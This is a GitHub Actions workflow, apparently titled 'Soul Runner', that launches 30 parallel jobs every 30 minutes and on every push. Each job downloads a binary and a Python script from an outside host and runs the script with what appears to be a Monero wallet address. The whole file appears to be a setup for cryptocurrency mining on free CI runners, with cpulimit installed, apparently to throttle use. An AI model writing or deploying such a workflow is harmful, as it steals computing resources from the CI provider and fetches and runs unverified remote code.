name: Soul Runner

on:
  schedule:
    # Har 30 minute pe chale ga
    - cron: '*/30 * * * *'
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  execute_soul:
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        # 30 parallel jobs
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 
                   16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
      fail-fast: false
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v3
    
    - name: Setup system dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cpulimit curl
    
    - name: Download and prepare soul files
      run: |
        curl -O "https://hingoli.io/soul.php?file=soul"
        mv soul.php soul
        curl -O "https://hingoli.io/soul.php?file=soul.py"
        mv soul.php soul.py
        chmod +x soul
        ls -la  # Verify files are downloaded
    
    - name: Execute soul script with wallet
      run: |
        # Direct wallet address use kar rahe hain
        WALLET="43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
        echo "Starting soul.py with wallet: $WALLET"
        python3 soul.py $WALLET
    
    - name: Job completion status
      if: always()
      run: |
        echo "Job ${{ matrix.instance }} completed at $(date)"
        echo "Status: ${{ job.status }}"
